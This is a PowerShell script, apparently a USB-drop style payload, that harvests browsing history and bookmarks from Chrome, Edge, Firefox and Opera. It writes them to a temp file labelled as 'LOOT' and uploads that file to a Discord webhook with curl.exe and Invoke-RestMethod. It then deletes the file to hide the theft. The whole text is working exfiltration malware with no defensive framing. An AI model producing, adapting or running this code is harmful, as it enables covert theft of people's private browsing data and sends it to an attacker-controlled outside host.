# File to store the browser data
$FileName = "$env:TMP\$env:USERNAME-LOOT-browsers-$(Get-Date -Format 'yyyy-MM-dd_HH-mm').txt"

# Function to extract browser data using regex
function Get-BrowserData {
    [CmdletBinding()]
    param (	
        [Parameter (Position=1, Mandatory=$true)]
        [string]$Browser,
        [Parameter (Position=2, Mandatory=$true)]
        [string]$DataType 
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w\- ./?%&=]*)*?'

    # Define browser-specific file paths
    switch ("$Browser-$DataType") {
        'chrome-history'   { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
        'chrome-bookmarks' { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
        'edge-history'     { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History" }
        'edge-bookmarks'   { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks" }
        'firefox-history'  { $Path = (Get-ChildItem "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\" -Directory | Where-Object { $_.Name -like '*.default-release' } | Select-Object -First 1).FullName + "\places.sqlite" }
        'opera-history'    { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" }
        'opera-bookmarks'  { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks" }
        default            { return }
    }

    # Check file exists
    if (-not (Test-Path $Path)) {
        Write-Verbose "Path not found: $Path"
        return
    }

    # Extract matches from file using regex
    try {
        Get-Content -Path $Path -ErrorAction Stop | 
            Select-String -AllMatches $Regex | 
            ForEach-Object {
                $_.Matches.Value | Sort -Unique | ForEach-Object {
                    [PSCustomObject]@{
                        User     = $env:USERNAME
                        Browser  = $Browser
                        DataType = $DataType
                        Data     = $_
                    }
                }
            }
    } catch {
        Write-Warning "Failed to read: $Path"
    }
}

# Call the function for each browser and datatype and store results
$AllData = @()
$AllData += Get-BrowserData -Browser "edge" -DataType "history"
$AllData += Get-BrowserData -Browser "edge" -DataType "bookmarks"
$AllData += Get-BrowserData -Browser "chrome" -DataType "history"
$AllData += Get-BrowserData -Browser "chrome" -DataType "bookmarks"
$AllData += Get-BrowserData -Browser "firefox" -DataType "history"
$AllData += Get-BrowserData -Browser "opera" -DataType "history"
$AllData += Get-BrowserData -Browser "opera" -DataType "bookmarks"

# Format output and write to file
if ($AllData.Count -gt 0) {
    $AllData | ForEach-Object {
        "$($_.User), $($_.Browser), $($_.DataType), $($_.Data)"
    } | Out-File -FilePath $FileName -Encoding UTF8
} else {
    "No browser data found." | Out-File -FilePath $FileName -Encoding UTF8
}

# -----------------------------------------
# Function to upload file to Discord
function Upload-Discord {
    [CmdletBinding()]
    param (
        [Parameter(Position=0, Mandatory=$false)]
        [string]$file,
        [Parameter(Position=1, Mandatory=$false)]
        [string]$text
    )

    # Discord webhook URL - make sure $dc is defined!
    $hookurl = "$dc"

    # Message body
    $Body = @{
        'username' = $env:USERNAME
        'content'  = $text
    }

    # Send message
    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    # Upload file
    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

# Upload file if webhook URL is set
if (-not ([string]::IsNullOrEmpty($dc))) {
    Upload-Discord -file $FileName -text "Browser data for $env:USERNAME"
}

# -----------------------------------------
# Cleanup
Remove-Item -Path $FileName -Force -ErrorAction SilentlyContinue
